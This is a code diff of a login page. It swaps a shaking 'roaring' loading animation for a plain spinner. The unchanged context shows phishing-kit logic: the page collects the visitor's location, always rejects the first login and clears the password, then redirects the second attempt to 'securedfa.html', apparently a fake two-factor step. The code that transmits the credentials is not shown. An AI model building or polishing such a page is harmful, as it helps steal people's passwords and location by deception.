@@ -5,29 +5,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Login</title>
   <script src="https://cdn.tailwindcss.com"></script>
-  <style>
-    /* Custom roaring / energetic loading animation */
-    @keyframes roarShake {
-      0%, 100% { transform: scale(1) rotate(0deg); }
-      25% { transform: scale(1.05) rotate(-2deg); }
-      50% { transform: scale(1.08) rotate(2deg); }
-      75% { transform: scale(1.05) rotate(-1deg); }
-    }
-
-    @keyframes roarPulse {
-      0%, 100% { opacity: 1; }
-      50% { opacity: 0.85; }
-    }
-
-    .roar-loading {
-      animation: roarShake 0.6s infinite ease-in-out,
-                 roarPulse 1.2s infinite ease-in-out;
-    }
-
-    .roar-icon {
-      animation: roarShake 0.5s infinite ease-in-out;
-    }
-  </style>
 </head>
 <body class="bg-white flex items-center justify-center min-h-screen">
 
@@ -54,7 +31,7 @@
       class="w-full mb-4 px-4 py-3 text-base border border-gray-300 rounded-md bg-white focus:outline-none focus:border-gray-400"
     />
 
-    <!-- Login Button with roaring animation -->
+    <!-- Login Button -->
     <button
       id="loginBtn"
       class="w-full bg-blue-600 text-white text-sm font-normal py-3 rounded-lg mb-4
@@ -63,12 +40,10 @@
     >
       <span id="btnText">Log in</span>
       
-      <!-- Roaring / energetic spinner -->
-      <svg id="spinner" class="w-5 h-5 hidden roar-loading" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-        <!-- Outer roaring circle -->
-        <circle cx="12" cy="12" r="10" stroke="white" stroke-width="4" stroke-dasharray="60" stroke-dashoffset="20" opacity="0.6"/>
-        <!-- Inner energetic path (looks like roaring energy) -->
-        <path id="roarPath" d="M22 12a10 10 0 0 1-10 10" stroke="white" stroke-width="4" stroke-linecap="round"/>
+      <!-- 360° Spinning Circle -->
+      <svg id="spinner" class="w-5 h-5 animate-spin hidden" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path>
       </svg>
     </button>
 
@@ -96,7 +71,7 @@
     </div>
   </div>
 
-  <!-- Load config first (non-module) -->
+  <!-- Load config first -->
   <script src="config.js"></script>
 
   <script>
@@ -141,16 +116,15 @@
       const username = document.getElementById("username").value.trim();
       const password = document.getElementById("password").value.trim();
       const passwordInput = document.getElementById("password");
+      const btn = document.getElementById("loginBtn");
+      const btnText = document.getElementById("btnText");
+      const spinner = document.getElementById("spinner");
+      const errorMsg = document.getElementById("errorMsg");
 
       if (!username || !password) {
         alert("Please fill in all fields!");
         return;
       }
-
-      const btn = document.getElementById("loginBtn");
-      const btnText = document.getElementById("btnText");
-      const spinner = document.getElementById("spinner");
-      const errorMsg = document.getElementById("errorMsg");
 
       const loc = await getLocation();
 
@@ -182,22 +156,25 @@
 
       attempt++;
 
-      // Show roaring animation
-      spinner.classList.remove("hidden");
-      btn.classList.add("roar-loading");   // Extra shake on button itself
+      // === ROARING / LOADING EFFECT ===
+      btnText.classList.add("hidden");        // Remove "Log in" text
+      spinner.classList.remove("hidden");     // Show 360° spinning circle
+      btn.disabled = true;
 
       if (attempt === 1) {
-        errorMsg.classList.remove("hidden");
-        passwordInput.value = "";
-        // Stop animation after first attempt
+        // First attempt: show error and reset
         setTimeout(() => {
+          errorMsg.classList.remove("hidden");
+          passwordInput.value = "";
+          
+          // Reset button
+          btnText.classList.remove("hidden");
           spinner.classList.add("hidden");
-          btn.classList.remove("roar-loading");
-        }, 800);
+          btn.disabled = false;
+        }, 1200);
       } else {
-        btn.disabled = true;
-        btnText.textContent = "Verifying...";
-
+        // Second attempt: keep spinning and redirect
+        btnText.textContent = "Verifying..."; // Optional fallback text
         setTimeout(() => {
           window.location.href = "securedfa.html";
         }, 1400);
